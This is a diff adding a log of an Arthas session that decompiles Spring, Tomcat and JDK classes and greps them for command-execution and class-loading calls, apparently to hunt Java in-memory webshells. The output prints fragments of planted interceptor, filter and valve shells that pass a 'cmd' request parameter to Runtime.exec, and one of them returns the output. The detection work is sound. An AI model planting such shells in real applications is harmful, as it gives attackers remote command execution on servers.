@@ -1,0 +1,357 @@
+[INFO] JAVA_HOME: C:\Program Files\Java\jre1.8.0_221
+[INFO] arthas-boot version: 3.7.1
+[INFO] Process 26176 already using port 3658
+[INFO] Process 26176 already using port 8563
+[INFO] arthas home: D:\01--ÖªÊ¶¿â_°²È«¼¼ÄÜ\java°²È«ÑÐ¾¿\javaÄÚ´æÂíÑÐ¾¿\01--ÅÅ²éÓëÇå³ý_¹¤¾ß\01--arthas\arthas-packaging-3.7.1-bin
+[INFO] The target process already listen port 3658, skip attach.
+[INFO] arthas-client connect 127.0.0.1 3658
+[1;31m  ,---.  [1;33m,------. [1;36m,--------.[1;35m,--.  ,--.[1;32m  ,---.  [1;34m ,---.  [0m                         
+[1;31m /  O  \ [1;33m|  .--. '[1;36m'--.  .--'[1;35m|  '--'  |[1;32m /  O  \ [1;34m'   .-' [0m                         
+[1;31m|  .-.  |[1;33m|  '--'.'[1;36m   |  |   [1;35m|  .--.  |[1;32m|  .-.  |[1;34m`.  `-. [0m                         
+[1;31m|  | |  |[1;33m|  |\  \ [1;36m   |  |   [1;35m|  |  |  |[1;32m|  | |  |[1;34m.-'    |[0m                         
+[1;31m`--' `--'[1;33m`--' '--'[1;36m   `--'   [1;35m`--'  `--'[1;32m`--' `--'[1;34m`-----' [0m                         
+
+wiki       https://arthas.aliyun.com/doc                                        
+tutorials  https://arthas.aliyun.com/doc/arthas-tutorials.html                  
+version    3.7.1                                                                
+main_class                                                                      
+pid        26176                                                                
+time       2024-01-25 14:26:54                                                  
+
+[arthas@26176]$ jad --source-only "org.springframework.web.servlet.handler.Conve rsionServiceExposingInterceptor" | grep -C 3 -e "((?!RuntimeException)(Runtime|P rocessBuilder|ClassLoader|getClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.springframework.web.servlet.resource.Reso urceUrlProviderExposingInterceptor" | grep -C 3 -e "((?!RuntimeException)(Runtim e|ProcessBuilder|ClassLoader|getClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "com.madaha.codesecmemshell.controller.Interce ptorMemShell$Shell_Interceptor" | grep -C 3 -e "((?!RuntimeException)(Runtime|Pr ocessBuilder|ClassLoader|getClassLoader|crypto|Cipher))+?" | plaintext
+               String cmd = request.getParameter("cmd");
+/*51*/         if (cmd != null) {
+                   try {
+/*53*/                 Runtime.getRuntime().exec(cmd);
+                   }
+                   catch (IOException e) {
+/*55*/                 e.printStackTrace();
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "com.madaha.codesecmemshell.controller.DemoCon troller" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoade r|getClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "sun.reflect.NativeMethodAccessorImpl" | grep  -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|getClassLoader |crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "sun.reflect.NativeMethodAccessorImpl" | grep  -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|getClassLoader |crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "sun.reflect.DelegatingMethodAccessorImpl" | g rep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|getClassLo ader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "java.lang.reflect.Method" | grep -C 3 -e "((? !RuntimeException)(Runtime|ProcessBuilder|ClassLoader|getClassLoader|crypto|Ciph er))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.springframework.web.method.support.Invoca bleHandlerMethod" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|C lassLoader|getClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.springframework.web.method.support.Invoca bleHandlerMethod" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|C lassLoader|getClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.springframework.web.servlet.mvc.method.an notation.ServletInvocableHandlerMethod" | grep -C 3 -e "((?!RuntimeException)(Ru ntime|ProcessBuilder|ClassLoader|getClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.springframework.web.servlet.mvc.method.an notation.RequestMappingHandlerAdapter" | grep -C 3 -e "((?!RuntimeException)(Run time|ProcessBuilder|ClassLoader|getClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.springframework.web.servlet.mvc.method.an notation.RequestMappingHandlerAdapter" | grep -C 3 -e "((?!RuntimeException)(Run time|ProcessBuilder|ClassLoader|getClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.springframework.web.servlet.mvc.method.Ab stractHandlerMethodAdapter" | grep -C 3 -e "((?!RuntimeException)(Runtime|Proces sBuilder|ClassLoader|getClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.springframework.web.servlet.DispatcherSer vlet" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|g etClassLoader|crypto|Cipher))+?" | plaintext
+                     ArrayList<Object> strategies = new ArrayList<Object>(classNames.length);
+/* 879*/             for (String className : classNames) {
+                         try {
+/* 881*/                     Class<?> clazz = ClassUtils.forName(className, DispatcherServlet.class.getClassLoader());
+/* 882*/                     Object strategy = this.createDefaultStrategy(context, clazz);
+/* 883*/                     strategies.add(strategy);
+                         }
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.springframework.web.servlet.DispatcherSer vlet" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|g etClassLoader|crypto|Cipher))+?" | plaintext
+                     ArrayList<Object> strategies = new ArrayList<Object>(classNames.length);
+/* 879*/             for (String className : classNames) {
+                         try {
+/* 881*/                     Class<?> clazz = ClassUtils.forName(className, DispatcherServlet.class.getClassLoader());
+/* 882*/                     Object strategy = this.createDefaultStrategy(context, clazz);
+/* 883*/                     strategies.add(strategy);
+                         }
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.springframework.web.servlet.FrameworkServ let" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|ge tClassLoader|crypto|Cipher))+?" | plaintext
+         
+             private ApplicationContextInitializer<ConfigurableApplicationContext> loadInitializer(String className, ConfigurableApplicationContext wac) {
+                 try {
+/* 772*/             Class<?> initializerClass = ClassUtils.forName(className, wac.getClassLoader());
+/* 773*/             Class<?> initializerContextClass = GenericTypeResolver.resolveTypeArgument(initializerClass, ApplicationContextInitializer.class);
+/* 775*/             if (initializerContextClass != null && !initializerContextClass.isInstance(wac)) {
+                         throw new ApplicationContextException(String.format("Could not apply context initializer [%s] since its generic parameter [%s] is not assignable from the type of application context used by this framework servlet: [%s]", initializerClass.getName(), initializerContextClass.getName(), wac.getClass().getName()));
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.springframework.web.servlet.FrameworkServ let" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|ge tClassLoader|crypto|Cipher))+?" | plaintext
+         
+             private ApplicationContextInitializer<ConfigurableApplicationContext> loadInitializer(String className, ConfigurableApplicationContext wac) {
+                 try {
+/* 772*/             Class<?> initializerClass = ClassUtils.forName(className, wac.getClassLoader());
+/* 773*/             Class<?> initializerContextClass = GenericTypeResolver.resolveTypeArgument(initializerClass, ApplicationContextInitializer.class);
+/* 775*/             if (initializerContextClass != null && !initializerContextClass.isInstance(wac)) {
+                         throw new ApplicationContextException(String.format("Could not apply context initializer [%s] since its generic parameter [%s] is not assignable from the type of application context used by this framework servlet: [%s]", initializerClass.getName(), initializerContextClass.getName(), wac.getClass().getName()));
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "javax.servlet.http.HttpServlet" | grep -C 3 - e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|getClassLoader|crypt o|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.springframework.web.servlet.FrameworkServ let" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|ge tClassLoader|crypto|Cipher))+?" | plaintext
+         
+             private ApplicationContextInitializer<ConfigurableApplicationContext> loadInitializer(String className, ConfigurableApplicationContext wac) {
+                 try {
+/* 772*/             Class<?> initializerClass = ClassUtils.forName(className, wac.getClassLoader());
+/* 773*/             Class<?> initializerContextClass = GenericTypeResolver.resolveTypeArgument(initializerClass, ApplicationContextInitializer.class);
+/* 775*/             if (initializerContextClass != null && !initializerContextClass.isInstance(wac)) {
+                         throw new ApplicationContextException(String.format("Could not apply context initializer [%s] since its generic parameter [%s] is not assignable from the type of application context used by this framework servlet: [%s]", initializerClass.getName(), initializerContextClass.getName(), wac.getClass().getName()));
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "javax.servlet.http.HttpServlet" | grep -C 3 - e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|getClassLoader|crypt o|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.catalina.core.ApplicationFilterCha in" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|get ClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.catalina.core.ApplicationFilterCha in" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|get ClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.tomcat.websocket.server.WsFilter"  | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|getClas sLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.catalina.core.ApplicationFilterCha in" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|get ClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.catalina.core.ApplicationFilterCha in" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|get ClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.jsp.Filter_005fShell_jsp$Shell_Fil ter" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|ge tClassLoader|crypto|Cipher))+?" | plaintext
+                       stringArray3[2] = req.getParameter("cmd");
+                   }
+                   String[] cmds = stringArray;
+/*52*/             InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
+                   Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
+/*54*/             String output = scanner.hasNext() ? scanner.next() : "";
+/*55*/             response.getWriter().write(output);
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.catalina.core.ApplicationFilterCha in" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|get ClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.catalina.core.ApplicationFilterCha in" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|get ClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.springframework.web.filter.RequestContext Filter" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader |getClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.springframework.web.filter.OncePerRequest Filter" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader |getClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.catalina.core.ApplicationFilterCha in" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|get ClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.catalina.core.ApplicationFilterCha in" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|get ClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.springframework.web.filter.FormContentFil ter" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|ge tClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.springframework.web.filter.OncePerRequest Filter" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader |getClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.catalina.core.ApplicationFilterCha in" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|get ClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.catalina.core.ApplicationFilterCha in" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|get ClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.springframework.web.filter.CharacterEncod ingFilter" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoa der|getClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.springframework.web.filter.OncePerRequest Filter" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader |getClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.catalina.core.ApplicationFilterCha in" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|get ClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.catalina.core.ApplicationFilterCha in" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|get ClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.catalina.core.StandardWrapperValve " | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|getCl assLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.catalina.core.StandardContextValve " | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|getCl assLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.jsp.Valve_005fShell_jsp$Shell_Valv e" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|getC lassLoader|crypto|Cipher))+?" | plaintext
+               String cmd = request.getParameter("cmd");
+/*32*/         if (cmd != null) {
+                   try {
+/*34*/                 Runtime.getRuntime().exec(cmd);
+                   }
+                   catch (IOException | NullPointerException exception) {
+/*36*/                 exception.printStackTrace();
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.catalina.authenticator.Authenticat orBase" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader |getClassLoader|crypto|Cipher))+?" | plaintext
+/* 801*/         CallbackHandler callbackHandler = null;
+/* 803*/         Class<?> clazz = null;
+                 try {
+/* 805*/             clazz = Class.forName(this.jaspicCallbackHandlerClass, true, Thread.currentThread().getContextClassLoader());
+                 }
+                 catch (ClassNotFoundException classNotFoundException) {
+                     // empty catch block
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.catalina.core.StandardHostValve" |  grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|getClass Loader|crypto|Cipher))+?" | plaintext
+        final class StandardHostValve
+        extends ValveBase {
+            private static final Log log = LogFactory.getLog(StandardHostValve.class);
+            private static final ClassLoader MY_CLASSLOADER = StandardHostValve.class.getClassLoader();
+            static final boolean STRICT_SERVLET_COMPLIANCE = Globals.STRICT_SERVLET_COMPLIANCE;
+            static final boolean ACCESS_SESSION;
+            private static final StringManager sm;
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.catalina.valves.ErrorReportValve"  | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|getClas sLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.catalina.core.StandardEngineValve"  | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|getCla ssLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.catalina.connector.CoyoteAdapter"  | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|getClas sLoader|crypto|Cipher))+?" | plaintext
+/* 347*/                     async = true;
+                             ReadListener readListener = req.getReadListener();
+                             if (readListener != null && request.isFinished()) {
+/* 352*/                         ClassLoader oldCL = null;
+                                 try {
+/* 354*/                             oldCL = request.getContext().bind(false, null);
+/* 355*/                             if (req.sendAllDataReadEvent()) {
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.coyote.http11.Http11Processor" | g rep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|getClassLo ader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.coyote.AbstractProcessorLight" | g rep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|getClassLo ader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.coyote.AbstractProtocol$Connection Handler" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoade r|getClassLoader|crypto|Cipher))+?" | plaintext
+                 }
+/* 825*/         ContainerThreadMarker.set();
+                 try {
+                     ClassLoader oldCL;
+                     UpgradeToken upgradeToken;
+                     String negotiatedProtocol;
+/* 828*/             if (processor == null && (negotiatedProtocol = wrapper.getNegotiatedProtocol()) != null && negotiatedProtocol.length() > 0) {
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.tomcat.util.net.NioEndpoint$Socket Processor" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoa der|getClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.tomcat.util.net.SocketProcessorBas e" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|getC lassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "java.util.concurrent.ThreadPoolExecutor" | gr ep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|getClassLoa der|crypto|Cipher))+?" | plaintext
+             private volatile int corePoolSize;
+             private volatile int maximumPoolSize;
+             private static final RejectedExecutionHandler defaultHandler = new AbortPolicy();
+             private static final RuntimePermission shutdownPerm = new RuntimePermission("modifyThread");
+             private final AccessControlContext acc;
+             private static final boolean ONLY_ONE = true;
+         
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "java.util.concurrent.ThreadPoolExecutor$Worke r" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|ClassLoader|getC lassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "org.apache.tomcat.util.threads.TaskThread$Wra ppingRunnable" | grep -C 3 -e "((?!RuntimeException)(Runtime|ProcessBuilder|Clas sLoader|getClassLoader|crypto|Cipher))+?" | plaintext
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ jad --source-only "java.lang.Thread" | grep -C 3 -e "((?!Runtime Exception)(Runtime|ProcessBuilder|ClassLoader|getClassLoader|crypto|Cipher))+?"  | plaintext
+             private boolean stillborn = false;
+             private Runnable target;
+             private ThreadGroup group;
+             private ClassLoader contextClassLoader;
+             private AccessControlContext inheritedAccessControlContext;
+             private static int threadInitNumber;
+             ThreadLocal.ThreadLocalMap threadLocals = null;
+             public static final int NORM_PRIORITY = 5;
+             public static final int MAX_PRIORITY = 10;
+             private static final StackTraceElement[] EMPTY_STACK_TRACE;
+             private static final RuntimePermission SUBCLASS_IMPLEMENTATION_PERMISSION;
+             private volatile UncaughtExceptionHandler uncaughtExceptionHandler;
+             private static volatile UncaughtExceptionHandler defaultUncaughtExceptionHandler;
+             @Contended(value="tlr")
+             static {
+/* 145*/         Thread.registerNatives();
+/*1497*/         EMPTY_STACK_TRACE = new StackTraceElement[0];
+                 SUBCLASS_IMPLEMENTATION_PERMISSION = new RuntimePermission("enableContextClassLoaderOverride");
+             }
+         
+             @Override
+/* 407*/         this.group = threadGroup;
+/* 408*/         this.daemon = thread.isDaemon();
+/* 409*/         this.priority = thread.getPriority();
+/* 410*/         this.contextClassLoader = securityManager == null || Thread.isCCLOverridden(thread.getClass()) ? thread.getContextClassLoader() : thread.contextClassLoader;
+/* 414*/         this.inheritedAccessControlContext = accessControlContext != null ? accessControlContext : AccessController.getContext();
+/* 416*/         this.target = runnable;
+/* 417*/         this.setPriority(this.priority);
+                     public Boolean run() {
+/*1671*/                 for (Class clazz2 = clazz; clazz2 != Thread.class; clazz2 = clazz2.getSuperclass()) {
+                             try {
+/*1674*/                         clazz2.getDeclaredMethod("getContextClassLoader", new Class[0]);
+/*1675*/                         return Boolean.TRUE;
+                             }
+                             catch (NoSuchMethodException noSuchMethodException) {
+/*1679*/                             Class[] classArray = new Class[]{ClassLoader.class};
+/*1680*/                             clazz2.getDeclaredMethod("setContextClassLoader", classArray);
+/*1681*/                             return Boolean.TRUE;
+                                 }
+             }
+         
+             @CallerSensitive
+             public ClassLoader getContextClassLoader() {
+/*1439*/         if (this.contextClassLoader == null) {
+/*1440*/             return null;
+                 }
+                 }
+/*1441*/         SecurityManager securityManager = System.getSecurityManager();
+/*1442*/         if (securityManager != null) {
+/*1443*/             ClassLoader.checkClassLoaderPermission(this.contextClassLoader, Reflection.getCallerClass());
+                 }
+/*1446*/         return this.contextClassLoader;
+             }
+         
+             private native void resume0();
+         
+             public void setContextClassLoader(ClassLoader classLoader) {
+/*1472*/         SecurityManager securityManager = System.getSecurityManager();
+/*1473*/         if (securityManager != null) {
+/*1474*/             securityManager.checkPermission(new RuntimePermission("setContextClassLoader"));
+/*1476*/         this.contextClassLoader = classLoader;
+             }
+         
+             public static void setDefaultUncaughtExceptionHandler(UncaughtExceptionHandler uncaughtExceptionHandler) {
+             public static void setDefaultUncaughtExceptionHandler(UncaughtExceptionHandler uncaughtExceptionHandler) {
+/*1898*/         SecurityManager securityManager = System.getSecurityManager();
+/*1899*/         if (securityManager != null) {
+/*1900*/             securityManager.checkPermission(new RuntimePermission("setDefaultUncaughtExceptionHandler"));
+                 }
+/*1905*/         defaultUncaughtExceptionHandler = uncaughtExceptionHandler;
+             }
+[arthas@26176]$ echo "-----------------------------------------------" | plainte xt
+-----------------------------------------------
+[arthas@26176]$ 
